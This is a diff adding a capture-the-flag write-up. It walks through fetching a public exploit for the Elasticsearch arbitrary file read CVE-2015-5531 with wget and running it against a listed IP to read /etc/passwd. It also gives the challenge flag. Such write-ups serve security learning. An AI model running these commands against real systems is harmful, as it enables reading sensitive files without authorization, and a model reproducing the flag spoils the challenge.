@@ -1,0 +1,19 @@
+1. Opened the website at http://34.159.237.107:31853/ and saw that the main page exposed sensitive information about the Elasticsearch version, indicating it was vulnerable. 
+
+2. Installed exploitdb by running 
+
+git clone https://gitlab.com/exploit-database/exploitdb.git
+cd exploitdb
+sudo ln -sf $(pwd)/searchsploit /usr/local/bin/searchsploit to make searchsploit available system-wide.
+
+3. Installed libxml2-utils with sudo apt install libxml2-utils -y
+
+4. Learned that the vulnerability was CVE-2015-5531, an arbitrary file read in Elasticsearch versions below 1.6.1 via snapshot API calls
+
+5. Downloaded the exploit script from GitHub using wget https://raw.githubusercontent.com/nixawk/labs/master/CVE-2015-5531/exploit.py -O exploit_elastic.py
+
+6. Ran the exploit with python exploit_elastic.py http://34.159.237.107:31853 /etc/passwd to test if arbitrary file read worked
+
+7. The exploit returned the contents of /etc/passwd, and at the end of the output contained the flag CTF{265b92ed0091f139fdcd438196426f205fed9b14bce765bafd8344b1d96183e5}
+
+8. Converted the flag to lowercase ctf{} format as required and submitted it.
